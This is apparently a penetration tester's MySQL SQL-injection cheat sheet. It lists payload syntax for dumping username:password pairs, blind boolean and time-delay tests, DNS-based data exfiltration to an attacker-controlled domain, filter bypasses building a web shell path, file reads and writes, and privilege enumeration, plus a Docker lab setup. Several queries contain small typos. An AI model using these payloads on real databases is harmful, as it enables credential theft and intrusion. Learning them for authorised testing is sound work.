	# MySQL Database

## Comment Syntax

1. `#`
	* `#COMMENT HERE` 
2. `-- `
	* `-- COMMENT HERE`
	* Note the required whitespace
3. `/* */`
	* `/*COMMENT HERE*/` 

---

## Version Query Syntax

```sql
SELECT @@version
```

```sql
SELECT version()
```

---

## String Concatenation Syntax

```sql
SELECT CONCAT(username, ':', password) FROM users
```

* Takes a variable number of arguments
* Arguments can be column names from the target table or string literals

---

## Concatenate All Rows' Particular Column Value into a Single String

```sql
SELECT GROUP_CONCAT($COLUMN_NAME) FROM $TABLE_NAME
```

- This is a helpful alternative in SQL injection when you can only return a single row's column at a time
	- Instead of using `LIMIT` and multiple requests to return each row's value, you can use this to return all rows' value

---

## Cast an Integer into a Character

```sql
-- CHAR($INTEGER)
```

```sql
SELECT path FROM paths WHERE path = CONCAT(CHAR(47),'var',CHAR(47),'www',CHAR(47),'html',CHAR(47),'shell',CHAR(46),'php') -- /var/www/html/shell.php
```

* Especially helpful for bypassing tricky input restrictions on file paths (i.e., no `/`, `\`, and `.` allowed)


---

## Substring Syntax

```sql
SUBSTRING($STRING, $START_INDEX, $LENGTH)
```

```sql
SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1) > 'm'
```
* Indices start at 1

---

## Conditional Syntax

```sql
SELECT IF($CONDITION, $VALUE_IF_TRUE, $VALUE_IF_FALSE)
```

```sql
SELECT IF(COUNT(*) = 1, 1, 0) FROM users WHERE username = 'admin' AND password = 'password123' -- returns 1 if password equals 'password123', 0 otherwise
```

Alternatively,

```sql
SELECT CASE WHEN ($CONDITION) THEN $VALUE_IF_TRUE ELSE $VALUE_IF_FALSE END
```

```sql
SELECT CASE WHEN (COUNT(*) = 1) THEN 1 ELSE 0 END FROM users WHERE username = 'admin' and password = 'password123' -- returns 1 if password equals 'password123', 0 otherwise
```

---

## Time delay syntax

[Reference](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Unconditionally wait for 10 seconds

```sql
SELECT sleep(10)
```

### Conditionally wait for 10 seconds

```sql
SELECT IF ($CONDITION$, sleep(10), 'a')
```

---

## DNS Lookup Syntax

```sql
LOAD_FILE('\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
```
* Only works on Windows
* Requires stacked queries
* Requires the `FILE` privilege & `@@GLOBAL.secure_file_priv` must be equal to `''` (blank). Read more [here](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv).

---

## DNS Lookup with Data Exfiltration Syntax

```sql
SELECT $COLUMNS_TO_EXFIL INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
```
* Only works on Windows
* Requires stacked queries
* Requires the `FILE` privilege & `@@GLOBAL.secure_file_priv` must be equal to `''` (blank). Read more [here](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv).

---

## Get Current Database

```sql
SELECT database();
```

---

## Database enumeration

```sql
SELECT schema_name FROM information_schema.schemata
```

---

## Table enumeration

[[database-enumeration#Querying database tables non-Oracle]]

---

## Table column enumeration

[[database-enumeration#Querying database tables' columns non-Oracle]]

---

## Enumerate a Database's Tables and their Correspoding Columns

```sql
SELECT GROUP_CONCAT(TABLE_NAME, ':', COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA = '$DATABASE'
```

- Databases can be enumerated with [[mysql#Database enumeration|this query]]

---

## Table & Column Enumeration for Entire Database (One Request)

```sql
SELECT GROUP_CONCAT(CONCAT('\n', table_name, ':', column_name)) FROM information.schema.columns WHERE table_schema = '$DATABASE_NAME';
```

---

## Show Current User

```sql
SELECT CURRENT_USER()
```

---

## Show Current User's MySQL Privileges

### Via `SHOW GRANTS`

```sql
SHOW GRANTS
```

### Via Database Tables

The `information_schema.user_privileges` and `mysql.user` tables can be used to enumerate the current user's privileges.

```sql
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee = '$USERNAME_DOUBLE_SINGLE_QUOTED'
```

- `$USERNAME_DOUBLE_SINGLE_QUOTED` example: `user@localhost` would be `''user''@''localhost''`

```sql
SELECT user,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user" WHERE user = '$USERNAME'
```

- Note `file_priv`

---

## Read File

```sql
SELECT LOAD_FILE("$FILE_PATH")
```

---

## Write to File

```sql
SELECT "$CONTENT_TO_WRITE" INTO OUTFILE "$OUTFILE_PATH"
```

---

## Interact with test database

[Reference](https://hub.docker.com/r/genschsa/mysql-employees)

On a Linux machine with Docker installed, run the `mysql-employees` Docker container.
* Change `$PASSWORD`

```bash
docker run -d -it --rm \
  --name mysql-employees \
  -p 3306:3306 \
  -e MYSQL_ROOT_PASSWORD=blah \
  -v $PWD/data:/var/lib/mysql \
  genschsa/mysql-employees
```

Get a shell in the container.

```bash
docker exec -it mysql-employees /bin/bash
```

In the container, connect to the test MySQL database.

```bash
mysql -u root -p
```

Query away!